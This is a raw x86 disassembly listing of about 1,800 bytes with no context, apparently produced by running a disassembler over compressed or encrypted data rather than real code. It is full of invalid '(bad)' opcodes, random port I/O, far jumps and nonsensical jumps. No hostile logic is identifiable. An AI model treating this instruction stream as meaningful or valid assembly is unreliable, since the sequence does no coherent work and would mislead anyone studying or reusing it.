  6a466c:	inc    ecx
  6a466d:	sub    eax,0xc2c914fe
  6a4672:	dec    ebx
  6a4673:	push   cs
  6a4674:	xchg   ebp,eax
  6a4675:	fisubr WORD PTR [eax+0x31]
  6a4678:	je     0x6a46b2
  6a467a:	add    eax,0x6aeb4335
  6a467f:	repnz cs mov bh,0x7
  6a4683:	ins    DWORD PTR es:[edi],dx
  6a4684:	lods   eax,DWORD PTR ds:[esi]
  6a4685:	dec    ebp
  6a4686:	sub    eax,0x3d930954
  6a468b:	adc    dh,BYTE PTR [esi+0x635592a8]
  6a4691:	inc    eax
  6a4692:	adc    eax,0x328d31e8
  6a4697:	mov    bh,BYTE PTR [edx+0x22b98fc8]
  6a469d:	dec    ebx
  6a469e:	mov    al,0x8b
  6a46a0:	cli    
  6a46a1:	outs   dx,DWORD PTR ds:[esi]
  6a46a2:	jno    0x6a470c
  6a46a4:	adc    al,0x2e
  6a46a6:	sahf   
  6a46a7:	push   eax
  6a46a8:	pushf  
  6a46a9:	add    edx,DWORD PTR [esi]
  6a46ab:	push   edx
  6a46ac:	je     0x6a46ba
  6a46ae:	rol    BYTE PTR [ebx+edi*4],0xf1
  6a46b2:	push   esi
  6a46b3:	test   eax,0xa0d26b23
  6a46b8:	fist   WORD PTR [eax]
  6a46ba:	mov    cl,0x57
  6a46bc:	mov    esp,0xd688f4a7
  6a46c1:	test   al,0x94
  6a46c3:	xchg   esp,eax
  6a46c4:	stos   BYTE PTR es:[edi],al
  6a46c5:	push   ss
  6a46c6:	lock xor ch,BYTE PTR [eax]
  6a46c9:	push   0xffffff82
  6a46cb:	inc    ebx
  6a46cc:	imul   eax,DWORD PTR [edx],0xffffffd7
  6a46cf:	jecxz  0x6a4703
  6a46d1:	sti    
  6a46d2:	(bad)  
  6a46d3:	fist   DWORD PTR [edi+0x15552b9a]
  6a46d9:	das    
  6a46da:	mov    ds:0xff2e362b,al
  6a46df:	in     eax,0x97
  6a46e1:	(bad)  
  6a46e2:	mov    ch,0x61
  6a46e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a46e5:	dec    edi
  6a46e6:	xor    DWORD PTR [edx],eax
  6a46e8:	call   0xcabe:0xfda5c99a
  6a46ef:	pop    ebp
  6a46f0:	repz retf 
  6a46f2:	daa    
  6a46f3:	pop    DWORD PTR [esi-0x53]
  6a46f6:	shr    DWORD PTR [ebp-0x3a39baa2],0xcf
  6a46fd:	adc    edx,edx
  6a46ff:	push   ss
  6a4700:	clc    
  6a4701:	sub    eax,0x1cf3490d
  6a4706:	dec    edi
  6a4707:	out    0xfb,eax
  6a4709:	push   es
  6a470a:	or     al,0xfe
  6a470c:	cmp    al,0x40
  6a470e:	scas   al,BYTE PTR es:[edi]
  6a470f:	push   edx
  6a4710:	adc    DWORD PTR [ebx+0xd],esi
  6a4713:	loopne 0x6a4728
  6a4715:	cmp    dl,BYTE PTR [eax+0x66]
  6a4718:	rcr    BYTE PTR gs:[edi+0x2e],0x84
  6a471d:	lods   eax,DWORD PTR ds:[esi]
  6a471e:	xchg   ebx,eax
  6a471f:	mov    esi,ds
  6a4721:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a4722:	out    dx,al
  6a4723:	push   edi
  6a4724:	inc    edx
  6a4725:	fsub   DWORD PTR [edx+0x6b91c797]
  6a472b:	and    cl,dh
  6a472d:	shl    DWORD PTR [edx],0x26
  6a4730:	and    al,0x53
  6a4732:	sbb    BYTE PTR [edx+0x50],bh
  6a4735:	push   eax
  6a4736:	xor    DWORD PTR [ecx-0x53fd521c],0x50
  6a473d:	mov    edi,0x62fe2077
  6a4742:	xchg   esp,eax
  6a4743:	ss jmp 0x774ca667
  6a4749:	jbe    0x6a47ba
  6a474b:	jbe    0x6a47ca
  6a474d:	sbb    BYTE PTR [edi-0x393f881d],0xaa
  6a4754:	outs   dx,DWORD PTR ds:[esi]
  6a4755:	xchg   esi,eax
  6a4756:	into   
  6a4757:	adc    bh,BYTE PTR [eax+ecx*2-0x32]
  6a475b:	or     ebp,0x921db50b
  6a4761:	stos   BYTE PTR es:[edi],al
  6a4762:	push   edx
  6a4763:	fmul   QWORD PTR [eax]
  6a4765:	cld    
  6a4766:	int    0xb0
  6a4768:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a4769:	mov    edi,0x6cec30d7
  6a476e:	ficomp DWORD PTR [esi+0x22a2e6dc]
  6a4774:	and    bh,BYTE PTR [edx+0xa]
  6a4777:	mov    WORD PTR [edx+0x750c7bda],?
  6a477d:	push   eax
  6a477e:	in     eax,dx
  6a477f:	test   BYTE PTR [ecx],ah
  6a4781:	adc    al,0xae
  6a4783:	push   es
  6a4784:	ret    
  6a4785:	lods   al,BYTE PTR ds:[esi]
  6a4786:	test   BYTE PTR [esi+ecx*8+0x7d43ca15],bl
  6a478d:	mov    ch,0x68
  6a478f:	es jl  0x6a47ad
  6a4792:	adc    al,BYTE PTR [esi+edx*1]
  6a4795:	and    ah,BYTE PTR [edx]
  6a4797:	and    eax,0x160f8fb7
  6a479c:	sub    DWORD PTR [edi+edi*4+0x58b66bcb],ecx
  6a47a3:	mov    DWORD PTR [eax+0x2f],eax
  6a47a6:	lods   eax,DWORD PTR ds:[esi]
  6a47a7:	(bad)  
  6a47a8:	mov    edi,DWORD PTR [ebp-0x7b6e1c17]
  6a47ae:	pop    esp
  6a47af:	cmp    dh,BYTE PTR [ebx+ebx*1]
  6a47b2:	add    BYTE PTR [ebx],bh
  6a47b4:	lea    ebp,ds:0xd2b5eb78
  6a47ba:	sti    
  6a47bb:	ins    DWORD PTR es:[edi],dx
  6a47bc:	mov    al,ds:0x9677727b
  6a47c1:	sbb    BYTE PTR [esi],al
  6a47c3:	xchg   BYTE PTR ds:0xa0f3e9a2,al
  6a47c9:	xchg   esi,eax
  6a47ca:	cli    
  6a47cb:	mov    esp,DWORD PTR ds:0x14ba55c7
  6a47d1:	xor    eax,0xb7a45c7e
  6a47d6:	lea    edx,[ecx+0x6faa4e3f]
  6a47dc:	sub    DWORD PTR [ebp-0x2cc97ed1],edi
  6a47e2:	cmp    BYTE PTR [esi+ecx*2-0x27],cl
  6a47e6:	js     0x6a47ec
  6a47e8:	and    eax,DWORD PTR [eax+0x1ae882b4]
  6a47ee:	sbb    eax,0x719fa956
  6a47f3:	ror    DWORD PTR [esi-0x17],0x94
  6a47f7:	out    0xe4,al
  6a47f9:	shr    ebx,cl
  6a47fb:	xchg   ebp,eax
  6a47fc:	xor    eax,0x4f2b4412
  6a4801:	jnp    0x6a4803
  6a4803:	(bad)  
  6a4804:	in     al,dx
  6a4805:	mov    ds:0x82ff63b3,al
  6a480a:	dec    edi
  6a480b:	shl    DWORD PTR [edx+0x3f],cl
  6a480e:	cmp    BYTE PTR [ebx],dl
  6a4810:	lods   eax,DWORD PTR ds:[esi]
  6a4811:	push   ds
  6a4812:	addr16 std 
  6a4814:	pushf  
  6a4815:	dec    edi
  6a4816:	(bad)  
  6a4818:	in     al,dx
  6a4819:	mov    ecx,0x9c995ddf
  6a481e:	xor    bh,dh
  6a4820:	push   eax
  6a4821:	sbb    BYTE PTR [esi+esi*8-0x12],cl
  6a4825:	shr    DWORD PTR [edi+0x4f3d9cc8],cl
  6a482b:	mov    esp,0x34946f46
  6a4830:	sub    al,0x26
  6a4832:	clc    
  6a4833:	cli    
  6a4834:	jge    0x6a482b
  6a4836:	adc    DWORD PTR [edx],eax
  6a4838:	fwait
  6a4839:	js     0x6a47e1
  6a483b:	nop
  6a483c:	pop    eax
  6a483d:	inc    ecx
  6a483e:	and    eax,0x4baeaf3f
  6a4843:	jnp    0x6a4836
  6a4845:	sar    DWORD PTR [eax-0x4b],0xfb
  6a4849:	loopne 0x6a4845
  6a484b:	loope  0x6a4891
  6a484d:	leave  
  6a484e:	outs   dx,BYTE PTR ds:[esi]
  6a484f:	add    dh,bl
  6a4851:	cli    
  6a4852:	jmp    0x3ad31c96
  6a4857:	inc    edi
  6a4858:	aad    0x3d
  6a485a:	xchg   ecx,eax
  6a485b:	rol    BYTE PTR [esi],1
  6a485d:	int3   
  6a485e:	mov    WORD PTR [ebx-0x39aacb45],?
  6a4864:	std    
  6a4865:	mov    cl,0xe7
  6a4867:	shl    BYTE PTR [ebp-0x1e0c6d25],1
  6a486d:	jecxz  0x6a48c2
  6a486f:	push   ecx
  6a4870:	or     esp,DWORD PTR [edx+0xd471184]
  6a4876:	xor    DWORD PTR [edx+esi*2+0xfd90ed0],eax
  6a487d:	mov    eax,0x45dc693b
  6a4882:	adc    edi,DWORD PTR [eax+0x7bef2432]
  6a4888:	jmp    0x89a1:0x3f9a58ed
  6a488f:	adc    eax,0x53f8a0f2
  6a4894:	mov    al,0x74
  6a4896:	xabort 0xe3
  6a4899:	jb     0x6a4826
  6a489b:	mov    ebx,0x8d209a6
  6a48a0:	ins    BYTE PTR es:[edi],dx
  6a48a1:	jmp    0xa0db9ef3
  6a48a6:	pop    ecx
  6a48a7:	xor    DWORD PTR [ebp+0x3c],esi
  6a48aa:	fs push esi
  6a48ac:	into   
  6a48ad:	dec    esi
  6a48ae:	lock jp 0x6a490a
  6a48b1:	in     al,0xa0
  6a48b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a48b4:	ja     0x6a48b5
  6a48b6:	and    ch,bh
  6a48b8:	scas   al,BYTE PTR es:[edi]
  6a48b9:	sbb    ebx,DWORD PTR [ecx-0x7]
  6a48bc:	jmp    0x6a48bd
  6a48be:	inc    ebx
  6a48bf:	call   DWORD PTR [edi]
  6a48c1:	fimul  DWORD PTR [eax+0x272dde3a]
  6a48c7:	dec    edx
  6a48c8:	push   0x7a
  6a48ca:	loopne 0x6a4942
  6a48cc:	lods   eax,DWORD PTR ds:[esi]
  6a48cd:	aam    0x5a
  6a48cf:	int    0x9f
  6a48d1:	pop    esi
  6a48d2:	mov    dl,0x5d
  6a48d4:	inc    esi
  6a48d5:	jmp    0x3aefe43d
  6a48da:	das    
  6a48db:	cld    
  6a48dc:	(bad)
  6a48df:	pusha  
  6a48e0:	fistp  DWORD PTR [edx-0x339ac574]
  6a48e6:	mov    edx,0x87dbd95e
  6a48eb:	mov    al,0xcc
  6a48ed:	add    BYTE PTR ds:0xe9685fa5,al
  6a48f3:	std    
  6a48f4:	inc    esi
  6a48f5:	inc    esi
  6a48f6:	xchg   esp,eax
  6a48f7:	loope  0x6a48d2
  6a48f9:	xor    al,0xc9
  6a48fb:	je     0x6a492e
  6a48fd:	pop    ecx
  6a48fe:	mov    dh,0xdb
  6a4900:	mov    esp,0x4fd23564
  6a4905:	scas   eax,DWORD PTR es:[edi]
  6a4906:	mov    edx,0x7b869c8f
  6a490b:	add    edi,DWORD PTR [edi]
  6a490d:	cs mov dh,0x5b
  6a4910:	les    edi,FWORD PTR [ebp+ecx*4-0x32f4d9b2]
  6a4917:	inc    ebp
  6a4918:	add    BYTE PTR [esi+0x4fbff8fb],al
  6a491e:	into   
  6a491f:	jmp    0x49ecddd4
  6a4924:	sub    al,0x8a
  6a4926:	mov    esp,0x1033fea4
  6a492b:	and    DWORD PTR [edx-0x14e09031],edi
  6a4931:	outs   dx,DWORD PTR ds:[esi]
  6a4932:	mov    ch,0xc6
  6a4934:	int3   
  6a4935:	(bad)  
  6a4936:	cli    
  6a4937:	shl    BYTE PTR [edx+eax*1],cl
  6a493a:	pusha  
  6a493b:	inc    bl
  6a493d:	pop    ss
  6a493e:	pop    ebx
  6a493f:	sbb    esi,0xffffff92
  6a4942:	add    eax,0x48e93894
  6a4947:	mov    eax,0xf5c2bc17
  6a494c:	inc    esp
  6a494d:	cmp    edx,DWORD PTR [ebx-0x63]
  6a4950:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a4951:	out    dx,al
  6a4952:	jne    0x6a49b9
  6a4954:	es daa 
  6a4956:	lods   al,BYTE PTR gs:[esi]
  6a4958:	mov    cl,0x28
  6a495a:	imul   esp,DWORD PTR [ebx],0x6a9135fa
  6a4960:	or     dl,BYTE PTR [ebx+esi*2+0x7348b96]
  6a4967:	inc    ebx
  6a4968:	mov    ch,0x3c
  6a496a:	adc    al,0x73
  6a496c:	popa   
  6a496d:	rol    BYTE PTR [eax+0x70],0x2
  6a4971:	call   0x92e31de3
  6a4976:	push   ebp
  6a4977:	sbb    esp,ebp
  6a4979:	mov    dh,0xc9
  6a497b:	inc    ebp
  6a497c:	loope  0x6a4959
  6a497e:	inc    edx
  6a497f:	out    dx,al
  6a4980:	dec    edi
  6a4981:	mov    ecx,0x9214c782
  6a4986:	fisubr WORD PTR [eax]
  6a4988:	lahf   
  6a4989:	lahf   
  6a498a:	mov    DWORD PTR [ebp-0x80],0xe2bf3cd1
  6a4991:	inc    ebx
  6a4992:	and    BYTE PTR ds:0x135c43ea,dl
  6a4998:	enter  0x9f74,0x21
  6a499c:	mov    ebp,0xf18417db
  6a49a1:	mov    ch,0xe4
  6a49a3:	add    al,BYTE PTR [ebp+0x186b6cd9]
  6a49a9:	repnz pushf 
  6a49ab:	sahf   
  6a49ac:	fnstsw WORD PTR [ebp+0x5d7c7189]
  6a49b2:	ja     0x6a4968
  6a49b4:	mov    esi,DWORD PTR [ecx+0xb]
  6a49b7:	inc    esp
  6a49b8:	inc    edi
  6a49b9:	hlt    
  6a49ba:	ret    
  6a49bb:	aas    
  6a49bc:	sbb    esi,DWORD PTR [eax+0x48]
  6a49bf:	clc    
  6a49c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a49c1:	cmp    eax,0x8f088641
  6a49c6:	std    
  6a49c7:	jno    0x6a4959
  6a49c9:	loope  0x6a4987
  6a49cb:	xor    BYTE PTR [esi],0xf1
  6a49ce:	sti    
  6a49cf:	jmp    0x31eb:0xe7519892
  6a49d6:	push   ds
  6a49d7:	push   ss
  6a49d8:	mov    WORD PTR [ebp-0x387df89f],?
  6a49de:	fld    st(0)
  6a49e0:	jo     0x6a4a59
  6a49e2:	push   cs
  6a49e3:	in     al,dx
  6a49e4:	(bad)  
  6a49e5:	aas    
  6a49e6:	add    ch,BYTE PTR cs:[eax-0x4a]
  6a49ea:	(bad)  
  6a49eb:	std    
  6a49ec:	or     bl,bl
  6a49ee:	xor    al,0x2c
  6a49f0:	stc    
  6a49f1:	jne    0x6a4a44
  6a49f3:	mov    al,ds:0xe8318344
  6a49f8:	push   es
  6a49f9:	xchg   ecx,eax
  6a49fa:	retf   
  6a49fb:	add    DWORD PTR [ebx],esi
  6a49fd:	stos   BYTE PTR es:[edi],al
  6a49fe:	ins    DWORD PTR es:[edi],dx
  6a49ff:	jbe    0x6a4a13
  6a4a01:	repnz (bad) 
  6a4a03:	neg    DWORD PTR [esi-0xa]
  6a4a06:	mov    esi,0x82994d69
  6a4a0b:	(bad)  
  6a4a0c:	scas   al,BYTE PTR es:[edi]
  6a4a0d:	aas    
  6a4a0e:	push   ebp
  6a4a0f:	sar    BYTE PTR [ebx+eiz*4-0x6a],cl
  6a4a13:	mov    ebx,0xbece9613
  6a4a18:	out    0x72,eax
  6a4a1a:	imul   eax,DWORD PTR [ebx],0x1a
  6a4a1d:	int    0xf1
  6a4a1f:	rol    edx,1
  6a4a21:	inc    ecx
  6a4a22:	(bad)  
  6a4a23:	lahf   
  6a4a24:	push   ss
  6a4a25:	cmc    
  6a4a26:	stos   BYTE PTR es:[edi],al
  6a4a27:	cmp    ebp,DWORD PTR [ebp-0x1ac75200]
  6a4a2d:	xor    BYTE PTR [edx+0x19875aee],0x3f
  6a4a34:	push   0xc66a4e21
  6a4a39:	shl    BYTE PTR [edi],1
  6a4a3b:	(bad)  
  6a4a3c:	ror    dl,1
  6a4a3e:	jmp    FWORD PTR [edi]
  6a4a40:	mul    edx
  6a4a42:	sbb    BYTE PTR [esi],cl
  6a4a44:	sub    DWORD PTR [ecx],0x1e
  6a4a47:	push   esi
  6a4a48:	mov    eax,0x924eb215
  6a4a4d:	xor    al,0xc9
  6a4a4f:	and    ebp,esp
  6a4a51:	das    
  6a4a52:	inc    ecx
  6a4a53:	push   esp
  6a4a54:	lods   eax,DWORD PTR ds:[esi]
  6a4a55:	test   bl,ah
  6a4a57:	push   esp
  6a4a58:	fst    QWORD PTR [eax]
  6a4a5a:	icebp  
  6a4a5b:	xor    eax,0x5a130c41
  6a4a60:	and    al,0x8f
  6a4a62:	int3   
  6a4a63:	test   ecx,edx
  6a4a65:	mov    eax,ds:0x7d8da6f5
  6a4a6a:	das    
  6a4a6b:	stos   BYTE PTR es:[edi],al
  6a4a6c:	addr16 sti 
  6a4a6e:	pop    edi
  6a4a6f:	iret   
  6a4a70:	jno    0x6a4aae
  6a4a72:	push   0xffffffb1
  6a4a74:	xchg   ebp,eax
  6a4a75:	call   0x45e8d71
  6a4a7a:	mov    edx,0x1ef144f
  6a4a7f:	jl     0x6a4a3f
  6a4a81:	adc    al,0xc
  6a4a83:	(bad)  
  6a4a84:	or     dh,al
  6a4a86:	xor    DWORD PTR [edi],ebx
  6a4a88:	clc    
  6a4a89:	aaa    
  6a4a8a:	jmp    0xd5795d42
  6a4a8f:	(bad)  
  6a4a90:	pop    esp
  6a4a91:	cmc    
  6a4a92:	retf   
  6a4a93:	xchg   ecx,eax
  6a4a94:	call   0x96c8135d
  6a4a99:	sub    DWORD PTR [ebx+0x644103cb],ebx
  6a4a9f:	in     eax,0x48
  6a4aa1:	js     0x6a4af8
  6a4aa3:	mov    cl,0x58
  6a4aa5:	push   0xbf6c1900
  6a4aaa:	add    BYTE PTR [edx-0x64509caa],cl
  6a4ab0:	cmp    BYTE PTR [ebx+0x7468a803],al
  6a4ab6:	inc    ebp
  6a4ab7:	stc    
  6a4ab8:	jp     0x6a4aa2
  6a4aba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a4abb:	retf   0xacd5
  6a4abe:	mov    dl,BYTE PTR [ebp+0x3e28636d]
  6a4ac4:	shl    DWORD PTR [ebp+0x3807ccdb],0xb3
  6a4acb:	xchg   edx,eax
  6a4acc:	(bad)  
  6a4acd:	xchg   edx,eax
  6a4ace:	inc    ebx
  6a4acf:	pop    edx
  6a4ad0:	addr16 jmp 0xf9b3:0x174f61eb
  6a4ad8:	out    dx,eax
  6a4ad9:	push   esp
  6a4ada:	retf   0xd328
  6a4add:	scas   eax,DWORD PTR es:[edi]
  6a4ade:	adc    dl,BYTE PTR [ebp+0xf34862a]
  6a4ae4:	loop   0x6a4ac3
  6a4ae6:	clc    
  6a4ae7:	push   edi
  6a4ae8:	xor    DWORD PTR [esi-0x22e51e56],ecx
  6a4aee:	xlat   BYTE PTR ds:[ebx]
  6a4aef:	or     ebp,DWORD PTR [edi-0x7d]
  6a4af2:	sub    eax,0x89baa1f0
  6a4af7:	mul    DWORD PTR [eax+0x5d]
  6a4afa:	xor    al,0x35
  6a4afc:	shl    DWORD PTR [esi-0x43],1
  6a4aff:	push   0x76
  6a4b01:	jmp    0x6a4a9c
  6a4b03:	pop    esp
  6a4b04:	pop    esi
  6a4b05:	mov    eax,0x17e1e7ed
  6a4b0a:	mov    eax,ds:0x25089528
  6a4b0f:	mov    esi,0xc34962cc
  6a4b14:	cmp    BYTE PTR [eax],0x37
  6a4b17:	std    
  6a4b18:	jmp    0x6a8bf5c2
  6a4b1d:	dec    esp
  6a4b1e:	leave  
  6a4b1f:	mov    WORD PTR [edx+0x614dde59],ss
  6a4b25:	push   0xffffffbb
  6a4b27:	xlat   BYTE PTR ds:[ebx]
  6a4b28:	pop    ds
  6a4b29:	pop    es
  6a4b2a:	push   edx
  6a4b2b:	ins    BYTE PTR es:[edi],dx
  6a4b2c:	cmp    BYTE PTR [edx+esi*4+0x65846e11],ch
  6a4b33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a4b34:	xchg   edi,eax
  6a4b35:	iret   
  6a4b36:	aad    0x9f
  6a4b38:	jnp    0x6a4b83
  6a4b3a:	adc    BYTE PTR [ecx+0x6506adac],bh
  6a4b40:	aas    
  6a4b41:	push   esp
  6a4b42:	fstp   QWORD PTR [esi-0x37]
  6a4b45:	inc    esi
  6a4b46:	hlt    
  6a4b47:	sbb    DWORD PTR [ebx-0x9],ebx
  6a4b4a:	and    eax,0x77912f08
  6a4b4f:	fnstcw WORD PTR ds:[esi]
  6a4b52:	pop    eax
  6a4b53:	popa   
  6a4b54:	(bad)  
  6a4b55:	sub    DWORD PTR [eax],edx
  6a4b57:	sbb    DWORD PTR [edi-0x15],eax
  6a4b5a:	out    dx,eax
  6a4b5b:	arpl   WORD PTR [esi],bp
  6a4b5d:	aam    0x31
  6a4b5f:	adc    ebx,DWORD PTR [esi+0x70]
  6a4b62:	sub    BYTE PTR [edx-0x16],bh
  6a4b65:	cdq    
  6a4b66:	mov    cl,0x21
  6a4b68:	inc    edx
  6a4b69:	push   esi
  6a4b6a:	lahf   
  6a4b6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a4b6c:	(bad)  
  6a4b6d:	push   edx
  6a4b6e:	mov    ecx,0xbba01e07
  6a4b73:	stos   DWORD PTR es:[edi],eax
  6a4b74:	inc    edx
  6a4b75:	clc    
  6a4b76:	sub    edx,DWORD PTR [ecx]
  6a4b78:	adc    eax,0xd74b8346
  6a4b7d:	xchg   ebx,eax
  6a4b7e:	retf   
  6a4b7f:	xchg   DWORD PTR [edx+0xb5fb2e2],esi
  6a4b85:	or     BYTE PTR [edi+0x79524c9a],0xa4
  6a4b8c:	add    BYTE PTR [ecx+0x6a4937b9],ch
  6a4b92:	dec    edx
  6a4b93:	inc    ecx
  6a4b94:	dec    esp
  6a4b95:	das    
  6a4b96:	xor    edi,ebx
  6a4b98:	call   0xd80392f3
  6a4b9d:	scas   al,BYTE PTR es:[edi]
  6a4b9e:	sbb    bl,BYTE PTR [ecx+0x2d869600]
  6a4ba4:	or     al,0xb4
  6a4ba6:	les    ebx,FWORD PTR [eax+eiz*4+0x3e026dc5]
  6a4bad:	jo     0x6a4bf2
  6a4baf:	test   DWORD PTR [edx],ecx
  6a4bb1:	inc    esp
  6a4bb2:	test   BYTE PTR [esi+esi*1-0x488a1be4],al
  6a4bb9:	mov    WORD PTR [edx],cs
  6a4bbb:	repz sbb edi,esp
  6a4bbe:	or     eax,0x6f90eb72
  6a4bc3:	add    eax,DWORD PTR [eax+0x1a16a763]
  6a4bc9:	or     eax,0x74eb4944
  6a4bce:	inc    ebx
  6a4bcf:	test   al,0x4d
  6a4bd1:	ins    DWORD PTR es:[edi],dx
  6a4bd2:	lods   eax,DWORD PTR ds:[esi]
  6a4bd3:	cmc    
  6a4bd4:	in     al,dx
  6a4bd5:	dec    ebp
  6a4bd6:	push   0x3c52b254
  6a4bdb:	out    dx,al
  6a4bdc:	xchg   esp,eax
  6a4bdd:	add    al,0xb6
  6a4bdf:	sar    cl,1
  6a4be1:	pop    es
  6a4be2:	or     edx,DWORD PTR [edi-0x789bc851]
  6a4be8:	pop    esi
  6a4be9:	jg     0x6a4c30
  6a4beb:	mov    cl,BYTE PTR [ebx+ebx*2]
  6a4bee:	out    0xe,al
  6a4bf0:	add    al,0x32
  6a4bf2:	sub    esp,DWORD PTR [edx-0x358aa3ef]
  6a4bf8:	cdq    
  6a4bf9:	iret   
  6a4bfa:	or     eax,0xc81c1c72
  6a4bff:	pop    edi
  6a4c00:	dec    ebp
  6a4c01:	add    al,0x5a
  6a4c03:	ins    DWORD PTR es:[edi],dx
  6a4c04:	inc    eax
  6a4c05:	push   cs
  6a4c06:	bound  eax,QWORD PTR ds:[eax+0x74f5ecc8]
  6a4c0d:	or     dl,bh
  6a4c0f:	cmp    eax,0x8818972b
  6a4c14:	mov    bl,0x11
  6a4c16:	lds    eax,FWORD PTR [eax]
  6a4c18:	daa    
  6a4c19:	hlt    
  6a4c1a:	jp     0x6a4bd9
  6a4c1c:	mov    ds:0xabbb1b9,eax
  6a4c21:	add    al,0x44
  6a4c23:	lods   eax,DWORD PTR ds:[esi]
  6a4c24:	cli    
  6a4c25:	inc    esp
  6a4c26:	out    0x97,eax
  6a4c28:	mov    ebx,eax
  6a4c2a:	out    0xc3,eax
  6a4c2c:	pushf  
  6a4c2d:	jge    0x6a4bc8
  6a4c2f:	pusha  
  6a4c30:	xor    eax,0x850c7496
  6a4c35:	mov    esp,DWORD PTR [eax]
  6a4c37:	mov    edi,0x38a24328
  6a4c3c:	add    DWORD PTR [ebx+0x5efa3a78],edi
  6a4c42:	jg     0x6a4c42
  6a4c44:	push   0xffffffd1
  6a4c46:	mov    esi,0x8dc4e6bd
  6a4c4b:	dec    ebp
  6a4c4c:	dec    DWORD PTR [edi]
  6a4c4e:	xor    DWORD PTR [esi-0x57e9913c],0x17d95f98
  6a4c58:	mov    al,ds:0xe6821561
  6a4c5d:	mov    bh,0xa2
  6a4c5f:	cdq    
  6a4c60:	sub    DWORD PTR [edx],0xffffffcf
  6a4c63:	(bad)  
  6a4c64:	loopne 0x6a4c56
  6a4c66:	add    ebx,DWORD PTR [esp+edi*2]
  6a4c69:	dec    edi
  6a4c6a:	test   eax,0xc554cc0
  6a4c6f:	push   edi
  6a4c70:	not    DWORD PTR [ebx-0x7bd5f590]
  6a4c76:	and    BYTE PTR [edx-0x748a0113],cl
  6a4c7c:	pop    es
  6a4c7d:	jo     0x6a4c6f
  6a4c7f:	cs icebp 
  6a4c81:	inc    ecx
  6a4c82:	xchg   BYTE PTR [edx-0x6b],dh
  6a4c85:	push   ebx
  6a4c86:	xchg   esp,eax
  6a4c87:	mov    esp,0x100a5bee
  6a4c8d:	add    ecx,DWORD PTR [edx+0x1e]
  6a4c90:	arpl   WORD PTR [ecx+0x345771e1],ax
  6a4c96:	(bad)  
  6a4c97:	pop    eax
  6a4c98:	pop    ss
  6a4c99:	cmc    
  6a4c9a:	xchg   BYTE PTR [edi-0x60],dl
  6a4c9d:	sub    al,0x4c
  6a4c9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a4ca0:	push   esp
  6a4ca1:	idiv   BYTE PTR [edx]
  6a4ca3:	aaa    
  6a4ca4:	or     BYTE PTR [edx],bh
  6a4ca6:	dec    ecx
  6a4ca7:	jae    0x6a4c66
  6a4ca9:	mov    BYTE PTR [edx-0x7aa1fa75],cl
  6a4caf:	and    al,0xca
  6a4cb1:	push   cs
  6a4cb2:	push   ebx
  6a4cb3:	jnp    0x6a4cb3
  6a4cb5:	scas   al,BYTE PTR es:[edi]
  6a4cb6:	cmp    dh,BYTE PTR [eax]
  6a4cb8:	add    DWORD PTR [ebp-0x65a3f04b],eax
  6a4cbe:	leave  
  6a4cbf:	or     al,BYTE PTR [ebp+ecx*8-0x6a238f81]
  6a4cc6:	retf   
  6a4cc7:	pop    eax
  6a4cc8:	nop
  6a4cc9:	iret   
  6a4cca:	inc    edx
  6a4ccb:	adc    BYTE PTR [ebp+eiz*1-0x78],bh
  6a4ccf:	iret   
  6a4cd0:	fcom   QWORD PTR [ebp-0x7eb6ab19]
  6a4cd6:	sahf   
  6a4cd7:	lahf   
  6a4cd8:	dec    ebp
  6a4cd9:	mov    edi,0x7c632f41
  6a4cde:	retf   
  6a4cdf:	mov    ebp,0xefa87396
  6a4ce4:	jle    0x6a4cea
  6a4ce6:	jnp    0x6a4c87
  6a4ce8:	ins    DWORD PTR es:[edi],dx
  6a4ce9:	mov    dh,0x12
  6a4ceb:	jmp    0x6a4cbb
  6a4ced:	stc    
  6a4cee:	jmp    0xf3ce54c7
  6a4cf3:	adc    eax,0x59bad41a
  6a4cf8:	mov    esi,DWORD PTR [edi-0x514f9685]
  6a4cfe:	push   edi
  6a4cff:	sar    DWORD PTR [ebp+eax*4+0x14846762],cl
  6a4d06:	xor    ebx,DWORD PTR [ecx]
  6a4d08:	out    0xd0,eax
  6a4d0a:	test   BYTE PTR [eax+0x5562399d],ch
  6a4d10:	cs scas eax,DWORD PTR es:[edi]
  6a4d12:	cmpxchg BYTE PTR [ebx+0x6df8c449],al
  6a4d19:	adc    ebp,ebx
  6a4d1b:	stos   DWORD PTR es:[edi],eax
  6a4d1c:	adc    al,0xef
  6a4d1e:	in     al,0xd6
  6a4d20:	jp     0x6a4d37
  6a4d22:	sub    BYTE PTR [ebp+0x6a],al
  6a4d25:	stc    
  6a4d26:	pushf  
  6a4d27:	and    DWORD PTR [ebx+0x227498a8],ecx
  6a4d2d:	xchg   esi,eax
  6a4d2e:	dec    esi
  6a4d2f:	cmp    eax,0xb1fa3bee
  6a4d34:	cmp    ah,BYTE PTR [esi+0x1e24e7c8]
  6a4d3a:	mov    bh,0x77
  6a4d3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a4d3d:	sar    BYTE PTR ds:0x20dbddc9,1
  6a4d43:	pop    edx
  6a4d44:	cmp    bh,dh
  6a4d46:	inc    eax
  6a4d47:	sbb    esp,edi
  6a4d49:	stos   DWORD PTR es:[edi],eax
  6a4d4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a4d4b:	dec    edi
  6a4d4c:	or     al,0x37
  6a4d4e:	das    
  6a4d4f:	fndisi(8087 only) 
  6a4d51:	loope  0x6a4da4
  6a4d53:	sub    dl,BYTE PTR [esi-0x5]
  6a4d56:	sbb    BYTE PTR [ebp+0x74],bh
  6a4d59:	mov    edi,0x8fde6b42
  6a4d5e:	fwait
  6a4d5f:	mov    ebp,0x4506ad12
  6a4d64:	out    dx,al
  6a4d65:	mov    esi,0xcb1f0515
  6a4d6a:	adc    al,0x1f
  6a4d6c:	in     eax,dx
  6a4d6d:	push   ss
  6a4d6e:	push   edx
  6a4d6f:	loopne 0x6a4da2
  6a4d71:	setbe  dh
  6a4d74:	fs pop ss
  6a4d76:	mov    ebp,0xa13bdcb2
  6a4d7b:	or     al,0x28
